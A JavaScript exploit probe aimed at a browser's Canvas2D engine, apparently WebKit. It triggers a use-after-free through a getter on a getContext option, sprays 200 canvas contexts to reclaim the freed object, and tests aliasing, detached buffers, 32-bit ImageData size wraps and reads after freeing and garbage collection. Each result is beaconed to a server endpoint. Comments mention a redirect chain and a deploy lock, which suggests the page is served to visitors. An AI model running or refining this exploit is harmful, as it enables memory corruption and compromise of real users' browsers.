// p494 — Canvas2D aliased pair: ImageData / TextMetrics / paint-state confusion
//
// PRECONDITION: the p482/p489 same-type UAF has succeeded. dCtx1 (a JS wrapper
// whose CanvasRenderingContext2D was freed and whose slot was reclaimed by one
// of 200 sprayed 2d contexts) and sprayX[idx1] (the live wrapper for that slot)
// resolve to the SAME C++ CanvasRenderingContext2D. Every method invoked on
// either wrapper must therefore operate on canvas sprayC[idx1]'s state and
// backing store. This probe measures exactly how far that confusion reaches.
//
// Phases (cheap -> destructive; each phase beacons immediately so a crash
// still leaves the trail behind):
//   P0  build the alias (p489 baseline), capture wrapper/canvas identity
//   P1  shared backing store: draw via B, read via A; cross-putImageData
//   P2  ImageData backing-store identity / copy semantics / geometry
//   P3  TextMetrics through the alias (font state + returned doubles)
//   P4  fillStyle / CanvasGradient / CanvasPattern identity + paint result
//   P5  toDataURL (PNG IHDR parsed) / toBlob through both wrappers
//   P6  detached ImageData buffer: transfer .data.buffer out from under it
//   P7  IMAGE-DATA SIZE WRAP: createImageData at 32-bit-overflow dimensions
//   P8  free the owning canvas, drop refs, GC, read through dangling wrapper
//
// Probe-only: this file never touches index.html or the fa-*.html redirect
// chain, so it does not need the DEPLOY.lock slot.
//
// Beacon prefix: V494-
(function () {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();
  var MAXBODY = 420;
  var ENABLE_HUGE = true;   // set false to skip P7 (may OOM the WebContent process)

  function clip(s) {
    s = String(s === undefined ? '' : s);
    if (s.length > MAXBODY) s = s.substring(0, MAXBODY) + '...';
    return s;
  }

  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V494-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + (Date.now() - T0) + 'ms] ' + clip(body || ''));
    } catch (e) {}
  }

  // Runs fn, reports tag-THROW with name/message on exception.
  function safe(tag, fn) {
    try { return fn(); }
    catch (e) { B(tag + '-THROW', (e && e.name) + ': ' + (e && e.message)); return null; }
  }

  function sumBytes(a) {
    var s = 0;
    for (var i = 0; i < a.length; i++) s = (s + a[i]) % 4294967296;
    return s;
  }

  function diffCount(a, b) {
    if (!a || !b || a.length !== b.length) return -1;
    var n = 0;
    for (var i = 0; i < a.length; i++) if (a[i] !== b[i]) n++;
    return n;
  }

  function firstPx(a) {
    if (!a || a.length < 4) return 'n/a';
    return a[0] + ',' + a[1] + ',' + a[2] + ',' + a[3];
  }

  function cvDesc(c) {
    if (!c) return 'null';
    try {
      return (c.tagName || '?') + ':' + c.width + 'x' + c.height +
             ':' + (c.parentNode ? 'inDOM' : 'detached');
    } catch (e) { return 'err'; }
  }

  function pngDims(url) {
    try {
      var comma = url.indexOf(',');
      if (comma < 0) return 'no-comma';
      var bin = atob(url.substring(comma + 1));
      if (bin.length < 24) return 'short';
      var w = ((bin.charCodeAt(16) & 255) << 24) | ((bin.charCodeAt(17) & 255) << 16) |
              ((bin.charCodeAt(18) & 255) << 8) | (bin.charCodeAt(19) & 255);
      var h = ((bin.charCodeAt(20) & 255) << 24) | ((bin.charCodeAt(21) & 255) << 16) |
              ((bin.charCodeAt(22) & 255) << 8) | (bin.charCodeAt(23) & 255);
      return (w >>> 0) + 'x' + (h >>> 0);
    } catch (e) { return 'parse-err'; }
  }

  B('BOOT', navigator.userAgent + ' | ' + location.href);

  var root = document.body || document.documentElement;
  if (!root) { B('ABORT', 'no-document-root'); return; }

  // ═══════════════════════════════════════════════════════════════════
  // P0 — Build the alias (p489 same-type spray baseline)
  // ═══════════════════════════════════════════════════════════════════
  var dCtx1 = null, lCtx1 = null;
  var tc1 = document.createElement('canvas');
  tc1.width = 10; tc1.height = 10;
  root.appendChild(tc1);

  var cc1 = 0, s1 = {};
  Object.defineProperty(s1, 'desynchronized', {
    get: function () { cc1++; if (cc1 === 1) dCtx1 = tc1.getContext('2d'); return false; }
  });
  lCtx1 = tc1.getContext('2d', s1);

  if (!dCtx1) { B('ABORT', 'uaf1-fail'); return; }

  var sprayC = [], sprayX = [];
  for (var i = 0; i < 200; i++) {
    var c = document.createElement('canvas');
    c.width = 10; c.height = 10;
    sprayC.push(c);
    var ctx = c.getContext('2d');
    ctx.lineWidth = 500 + i;
    sprayX.push(ctx);
  }

  var lw1 = safe('P0-LW', function () { return dCtx1.lineWidth; });
  if (typeof lw1 !== 'number' || lw1 < 500 || lw1 >= 700) {
    B('UAF1-MISS', 'lw=' + lw1);
    return;
  }
  var idx1 = Math.round(lw1 - 500);
  B('UAF1-ALIAS', 'idx=' + idx1 + ';lw=' + lw1);

  // Bidirectional check before disturbing any state.
  sprayX[idx1].lineWidth = 777.25;
  var bidir = safe('P0-BIDIR', function () { return dCtx1.lineWidth; });
  if (bidir !== 777.25) {
    B('BIDIR-FAIL', 'wrote=777.25;read=' + bidir);
    return;
  }

  var sameWrapper = (dCtx1 === sprayX[idx1]);
  var cvB = safe('P0-CVB', function () { return sprayX[idx1].canvas; });
  var cvA = safe('P0-CVA', function () { return dCtx1.canvas; });
  B('IDENTITY', 'sameWrapper=' + sameWrapper +
    ';A=' + cvDesc(cvA) + ';B=' + cvDesc(cvB) +
    ';sameCanvas=' + (!!cvA && cvA === cvB) +
    ';wrapperCtor=' + (dCtx1.constructor && dCtx1.constructor.name));

  // The context object may be shared while the cached canvas wrapper differs.
  // Resizing through one side and reading through the other is the cheapest
  // proof that the backing store, not just the state struct, is shared.
  var cvOwn = cvB || cvA;
  var W = 64, H = 64;
  safe('P1-RESIZE', function () { cvOwn.width = W; cvOwn.height = H; });
  var widthViaA = safe('P1-WA', function () { return cvA ? cvA.width : -1; });
  var widthViaB = safe('P1-WB', function () { return cvB ? cvB.width : -1; });
  B('RESIZE', 'ownWidth=' + (cvOwn && cvOwn.width) +
    ';viaA=' + widthViaA + ';viaB=' + widthViaB +
    ';viaAReadsOwn=' + (widthViaA === W));

  // ═══════════════════════════════════════════════════════════════════
  // P1 — Shared backing store: draw through B, read through A
  // ═══════════════════════════════════════════════════════════════════
  var pxA = safe('P1-DRAW', function () {
    sprayX[idx1].fillStyle = 'rgb(17,34,51)';
    sprayX[idx1].fillRect(0, 0, W, H);
    return dCtx1.getImageData(0, 0, W, H);
  });

  if (!pxA) { B('P1-ABORT', 'getImageData returned nothing'); }
  else {
    var pxB = safe('P1-READ', function () { return sprayX[idx1].getImageData(0, 0, W, H); });
    B('PIX-SHARED', 'len=' + pxA.data.length +
      ';expect=' + (W * H * 4) +
      ';px0=' + firstPx(pxA.data) +
      ';diffA_B=' + (pxB ? diffCount(pxA.data, pxB.data) : 'noread') +
      ';sum=' + sumBytes(pxA.data));

    // If ImageData aliased the canvas buffer instead of copying it, mutating
    // .data would change the canvas. Spec says copy; measure it.
    var before0 = pxA.data[0];
    pxA.data[0] = 200; pxA.data[1] = 201; pxA.data[2] = 202; pxA.data[3] = 203;
    var pxC = safe('P1-COPY', function () { return dCtx1.getImageData(0, 0, 1, 1); });
    B('PIX-COPY', 'before=' + before0 +
      ';afterMutate=' + (pxC ? firstPx(pxC.data) : 'noread') +
      ';canvasFollowedMutate=' + (pxC ? (pxC.data[0] === 200) : 'n/a'));
  }

  // Cross-put: ImageData built through A, installed through B, read through A.
  var imCross = safe('P1-MK', function () { return dCtx1.createImageData(W, H); });
  if (imCross) {
    // Keep alpha at 255: semi-transparent pixels round-trip through the
    // premultiplied canvas buffer with rounding, which would fake a diff.
    for (var pi = 0; pi < imCross.data.length; pi++) {
      imCross.data[pi] = ((pi & 3) === 3) ? 255 : ((pi * 7) & 255);
    }
    safe('P1-PUT', function () { sprayX[idx1].putImageData(imCross, 0, 0); });
    var back = safe('P1-BACK', function () { return dCtx1.getImageData(0, 0, W, H); });
    B('PUT-CROSS', 'len=' + imCross.data.length +
      ';diffPut_Get=' + (back ? diffCount(imCross.data, back.data) : 'noread') +
      ';px0=' + (back ? firstPx(back.data) : 'n/a'));

    // Does the canvas retain the ImageData buffer, or copy it at put time?
    imCross.data[0] = 123; imCross.data[1] = 124; imCross.data[2] = 125;
    var afterPutMut = safe('P1-PUTCOPY', function () { return dCtx1.getImageData(0, 0, 1, 1); });
    B('PUT-COPY', 'px0=' + (afterPutMut ? firstPx(afterPutMut.data) : 'n/a') +
      ';canvasFollowsMutate=' + (afterPutMut ? (afterPutMut.data[0] === 123) : 'n/a'));

    // Dirty-rect form through the opposite wrapper.
    var imDirty = safe('P1-MK2', function () { return sprayX[idx1].createImageData(W, H); });
    if (imDirty) {
      for (var di = 0; di < imDirty.data.length; di++) {
        imDirty.data[di] = ((di & 3) === 3) ? 255 : 9;
      }
      safe('P1-DIRTY', function () { dCtx1.putImageData(imDirty, 0, 0, 0, 0, 4, 4); });
      var dirtyRead = safe('P1-DR', function () { return dCtx1.getImageData(0, 0, W, H); });
      if (dirtyRead) {
        var inBox = 0, outBox = 0;
        for (var y = 0; y < H; y++) {
          for (var x = 0; x < W; x++) {
            var off = (y * W + x) * 4;
            var isNine = dirtyRead.data[off] === 9 && dirtyRead.data[off + 1] === 9 &&
                         dirtyRead.data[off + 2] === 9 && dirtyRead.data[off + 3] === 255;
            if (x < 4 && y < 4) { if (isNine) inBox++; }
            else { if (isNine) outBox++; }
          }
        }
        B('PUT-DIRTY', 'inBox=' + inBox + '/16;outBox=' + outBox + '/' + (W * H - 16));
      }
    }
  }

  // ═══════════════════════════════════════════════════════════════════
  // P2 — ImageData backing-store identity, geometry checks
  // ═══════════════════════════════════════════════════════════════════
  var i1 = safe('P2-I1', function () { return dCtx1.createImageData(4, 4); });
  var i2 = safe('P2-I2', function () { return sprayX[idx1].createImageData(4, 4); });
  if (i1 && i2) {
    B('IMAGEDATA-ID', 'len1=' + i1.data.length + ';len2=' + i2.data.length +
      ';sameObj=' + (i1 === i2) +
      ';sameBuf=' + (i1.data.buffer === i2.data.buffer) +
      ';bufLen1=' + i1.data.buffer.byteLength +
      ';byteOffset=' + i1.data.byteOffset +
      ';isU8C=' + (i1.data instanceof Uint8ClampedArray) +
      ';ctor=' + Object.prototype.toString.call(i1));
  }

  var imgCtor = safe('P2-CTOR', function () {
    var u = new Uint8ClampedArray(16);
    var d = new ImageData(u, 2, 2);
    return 'ok:' + d.width + 'x' + d.height + ':' + d.data.length;
  });
  B('IMAGEDATA-CTOR', imgCtor || 'unavailable');

  // Geometry readback through the alias after a put (offset/clipping math).
  var geo = safe('P2-GEO', function () {
    var g = sprayX[idx1].createImageData(3, 5);
    return 'w=' + g.width + ';h=' + g.height + ';len=' + g.data.length +
           ';colorSpace=' + (g.colorSpace || 'none');
  });
  B('IMAGEDATA-GEO', geo || 'err');

  // ═══════════════════════════════════════════════════════════════════
  // P3 — TextMetrics: state sharing + the doubles it hands back
  // ═══════════════════════════════════════════════════════════════════
  var TM_PROPS = ['width', 'actualBoundingBoxLeft', 'actualBoundingBoxRight',
    'actualBoundingBoxAscent', 'actualBoundingBoxDescent',
    'fontBoundingBoxAscent', 'fontBoundingBoxDescent',
    'emHeightAscent', 'emHeightDescent', 'hangingBaseline',
    'alphabeticBaseline', 'ideographicBaseline'];

  safe('P3-SET', function () { sprayX[idx1].font = 'italic 700 48px sans-serif'; });
  var fontViaA = safe('P3-FONT', function () { return dCtx1.font; });
  B('FONT-SHARED', 'viaA=' + fontViaA + ';match=' + (fontViaA === 'italic 700 48px sans-serif'));

  var tm1 = safe('P3-M1', function () { return dCtx1.measureText('Wg'); });
  if (tm1) {
    var kv = [];
    var bad = 0;
    for (var ti = 0; ti < TM_PROPS.length; ti++) {
      var v = tm1[TM_PROPS[ti]];
      if (typeof v !== 'number' || !isFinite(v)) bad++;
      kv.push(TM_PROPS[ti] + '=' + v);
    }
    var tm2 = safe('P3-M2', function () { return sprayX[idx1].measureText('Wg'); });
    B('TEXTMETRICS', kv.join(';') + ';bad=' + bad +
      ';tmSame=' + (tm1 === tm2) +
      ';tmWidthMatch=' + (tm2 ? (tm1.width === tm2.width) : 'n/a') +
      ';len=' + (tm1.width | 0));

    // Very long string: does width stay finite / does anything wrap?
    var longS = '';
    for (var li = 0; li < 4096; li++) longS += 'M';
    var tmL = safe('P3-LONG', function () { return dCtx1.measureText(longS); });
    B('TEXTMETRICS-LONG', tmL ?
      'width=' + tmL.width + ';finite=' + isFinite(tmL.width) +
      ';abLeft=' + tmL.actualBoundingBoxLeft +
      ';abRight=' + tmL.actualBoundingBoxRight : 'null');
  } else {
    B('TEXTMETRICS', 'measureText-failed');
  }

  // ═══════════════════════════════════════════════════════════════════
  // P4 — fillStyle / CanvasGradient / CanvasPattern identity
  // ═══════════════════════════════════════════════════════════════════
  var grad = safe('P4-GRAD', function () {
    var g = dCtx1.createLinearGradient(0, 0, W, 0);
    g.addColorStop(0, '#ff0000');
    g.addColorStop(1, '#00ff00');
    sprayX[idx1].fillStyle = g;
    return g;
  });

  if (grad) {
    var fsA = safe('P4-FSA', function () { return dCtx1.fillStyle; });
    var fsB = safe('P4-FSB', function () { return sprayX[idx1].fillStyle; });
    var fsStr = '';
    safe('P4-STR', function () { fsStr = String(fsA); });
    B('STYLE-GRADIENT', 'sameAB=' + (fsA === fsB) +
      ';isOriginal=' + (fsA === grad) +
      ';tag=' + Object.prototype.toString.call(fsA) +
      ';typeof=' + typeof fsA +
      ';ownKeys=' + safe('P4-KEYS', function () { return Object.keys(fsA).length; }) +
      ';str=' + fsStr);

    var gradFill = safe('P4-FILL', function () {
      dCtx1.fillStyle = grad;
      dCtx1.fillRect(0, 0, W, H);
      return dCtx1.getImageData(0, 0, W, H);
    });
    if (gradFill) {
      var lo = (0 * W + 1) * 4, hi = (0 * W + (W - 2)) * 4;
      B('STYLE-GRAD-PAINT', 'left=' + firstPx(gradFill.data.slice(lo, lo + 4)) +
        ';right=' + firstPx(gradFill.data.slice(hi, hi + 4)));
    }

    // Gradient mutated through one wrapper, observed through the other.
    safe('P4-ADD', function () { sprayX[idx1].fillStyle.addColorStop(0.5, '#0000ff'); });
    var cstops = safe('P4-STOPS', function () {
      var g2 = dCtx1.fillStyle;
      return (g2 === grad) ? 'same' : 'diff';
    });
    B('GRADIENT-IDENT', 'afterAdd=' + cstops);
  } else {
    B('STYLE-GRADIENT', 'createLinearGradient-failed');
  }

  var patSrc = document.createElement('canvas');
  patSrc.width = 8; patSrc.height = 8;
  var patCtx = patSrc.getContext('2d');
  if (patCtx) {
    patCtx.fillStyle = '#ffffff';
    patCtx.fillRect(0, 0, 8, 8);
    patCtx.fillStyle = '#000000';
    patCtx.fillRect(0, 0, 4, 4);
  }
  var pat = safe('P4-PAT', function () {
    var p = dCtx1.createPattern(patSrc, 'repeat');
    if (!p) return null;
    sprayX[idx1].fillStyle = p;
    return p;
  });
  if (pat) {
    var psA = safe('P4-PSA', function () { return dCtx1.fillStyle; });
    var psB = safe('P4-PSB', function () { return sprayX[idx1].fillStyle; });
    safe('P4-PFILL', function () {
      sprayX[idx1].fillRect(0, 0, W, H);
      var pp = dCtx1.getImageData(0, 0, 8, 8);
      B('STYLE-PATTERN-PAINT', 'px0=' + firstPx(pp.data.slice(0, 4)) +
        ';px4=' + firstPx(pp.data.slice(16, 20)) +
        ';sum=' + sumBytes(pp.data));
    });
    B('STYLE-PATTERN', 'sameAB=' + (psA === psB) +
      ';isOriginal=' + (psA === pat) +
      ';tag=' + Object.prototype.toString.call(psA) +
      ';str=' + safe('P4-PSTR', function () { return String(psA); }));
  } else {
    B('STYLE-PATTERN', 'createPattern-failed');
  }

  // ═══════════════════════════════════════════════════════════════════
  // P5 — toDataURL / toBlob; PNG IHDR tells us WHICH canvas was encoded
  // ═══════════════════════════════════════════════════════════════════
  var urlA = safe('P5-URLA', function () { return cvA ? cvA.toDataURL('image/png') : ''; });
  var urlB = safe('P5-URLB', function () { return cvB ? cvB.toDataURL('image/png') : ''; });
  B('DATAURL', 'lenA=' + (urlA ? urlA.length : -1) +
    ';lenB=' + (urlB ? urlB.length : -1) +
    ';equal=' + (!!urlA && urlA === urlB) +
    ';dimsA=' + (urlA ? pngDims(urlA) : 'n/a') +
    ';dimsB=' + (urlB ? pngDims(urlB) : 'n/a') +
    ';head=' + (urlA ? urlA.substring(0, 30) : ''));

  // Fire toBlob now so its async callback has the rest of the probe to land.
  var blobState = 'not-issued';
  safe('P5-BLOB', function () {
    if (!cvOwn || !cvOwn.toBlob) { blobState = 'unsupported'; return; }
    blobState = 'pending';
    cvOwn.toBlob(function (blob) {
      if (!blob) { B('TOBLOB', 'null'); return; }
      B('TOBLOB', 'size=' + blob.size + ';type=' + blob.type);
    }, 'image/png');
  });

  // ═══════════════════════════════════════════════════════════════════
  // P6 — Detached ImageData buffer: can .data outlive its backing store?
  // ═══════════════════════════════════════════════════════════════════
  var detIm = safe('P6-MK', function () { return dCtx1.createImageData(8, 8); });
  if (detIm) {
    var detached = false, detErr = '';
    try {
      structuredClone(detIm.data.buffer, { transfer: [detIm.data.buffer] });
      detached = true;
    } catch (e) { detErr = (e && e.name) + ':' + (e && e.message); }

    B('DETACH', 'transferOk=' + detached +
      ';lenAfter=' + detIm.data.length +
      ';bufLenAfter=' + detIm.data.buffer.byteLength +
      ';err=' + detErr);

    if (detached) {
      var putRes = 'ok';
      try { sprayX[idx1].putImageData(detIm, 0, 0); }
      catch (e) { putRes = (e && e.name) + ':' + (e && e.message); }
      B('DETACH-PUT', putRes + ';len=' + detIm.data.length);
    }
  }

  // ═══════════════════════════════════════════════════════════════════
  // P7 — ImageData SIZE WRAP at 32-bit-overflow dimensions
  //
  // w*h*4 is computed in 32-bit in several historical WebKit paths. If a
  // dimension pair wraps the byte count to a small value while width/height
  // stay huge, putImageData() then indexes a tiny buffer as if it were big.
  // 32768*32768*4 == 2^32 and 65536*65536*4 == 2^34 are the canonical pairs.
  // ═══════════════════════════════════════════════════════════════════
  function tryCreate(tag, w, h) {
    var r = 'ok';
    try {
      var d = dCtx1.createImageData(w, h);
      r = 'ok;len=' + d.data.length + ';buf=' + d.data.buffer.byteLength +
          ';w=' + d.width + ';h=' + d.height;
    } catch (e) { r = (e && e.name) + ':' + (e && e.message); }
    B(tag, 'w=' + w + ';h=' + h + ';' + r);
  }

  tryCreate('SZ-NEG', -1, 10);
  tryCreate('SZ-ZERO', 0, 10);
  tryCreate('SZ-ZEROH', 10, 0);
  tryCreate('SZ-BIG1', 100000, 1);

  if (ENABLE_HUGE) {
    // Pointer-sized safety: only attempt these two; each is beaconed before
    // the call so an OOM kill is attributable to the exact pair.
    B('HUGE-BEGIN', '32768x32768 -> 2^32 bytes');
    tryCreate('SZ-WRAP32', 32768, 32768);
    B('HUGE-BEGIN2', '65536x65536 -> 2^34 bytes');
    tryCreate('SZ-WRAP34', 65536, 65536);
  }

  // ═══════════════════════════════════════════════════════════════════
  // P8 — Free the owning canvas, GC, then read through the dangling wrapper
  //
  // This is the "freed ImageBuffer" test. If the context keeps its canvas
  // alive (Ref), reads stay valid; if only the backing store died, pixels
  // become stale/garbage. Baseline hash is taken while still alive.
  // ═══════════════════════════════════════════════════════════════════
  var preSum = null, prePx = null;
  safe('P8-PRE', function () {
    sprayX[idx1].fillStyle = 'rgb(200,10,10)';
    sprayX[idx1].fillRect(0, 0, W, H);
    prePx = dCtx1.getImageData(0, 0, 4, 4);
    preSum = sumBytes(prePx.data);
  });
  B('FREE-PRE', 'sum=' + preSum + ';px0=' + (prePx ? firstPx(prePx.data) : 'n/a') +
    ';own=' + cvDesc(cvOwn) + ';blob=' + blobState);

  try {
    if (cvOwn && cvOwn.parentNode) cvOwn.parentNode.removeChild(cvOwn);
  } catch (e) { B('FREE-DOM-ERR', (e && e.name) + ':' + (e && e.message)); }

  // Drop every JS reference we hold to the owning canvas + its context.
  sprayC[idx1] = null;
  sprayX[idx1] = null;
  cvOwn = null;
  cvA = null;
  cvB = null;
  patSrc = null;
  patCtx = null;
  pat = null;

  for (var round = 0; round < 5; round++) {
    var junk = [];
    for (var g = 0; g < 4000; g++) {
      junk.push({ a: new ArrayBuffer(32 + round * 16), b: [g], s: 'xxxxxxxx' });
    }
    junk = null;
  }
  B('FREE-GC', 'done;blob=' + blobState);

  safe('FREE-READ', function () {
    var p = dCtx1.getImageData(0, 0, 4, 4);
    B('FREE-READ', 'ok=1;len=' + p.data.length +
      ';sum=' + sumBytes(p.data) +
      ';delta=' + (preSum === null ? 'n/a' : (sumBytes(p.data) - preSum)) +
      ';px0=' + firstPx(p.data));
  });

  safe('FREE-CANVAS', function () {
    var c2 = dCtx1.canvas;
    B('FREE-CANVAS', 'cv=' + cvDesc(c2) +
      ';sameEl=' + (c2 === tc1) +
      ';width=' + (c2 ? c2.width : -1));
  });

  safe('FREE-FONT', function () {
    dCtx1.font = '11px monospace';
    var f = dCtx1.measureText('A').width;
    B('FREE-FONT', 'ok=1;measure=' + f);
  });

  B('DONE', 'idx=' + idx1 + ';sameWrapper=' + sameWrapper +
    ';blob=' + blobState + ';huge=' + ENABLE_HUGE);
})();
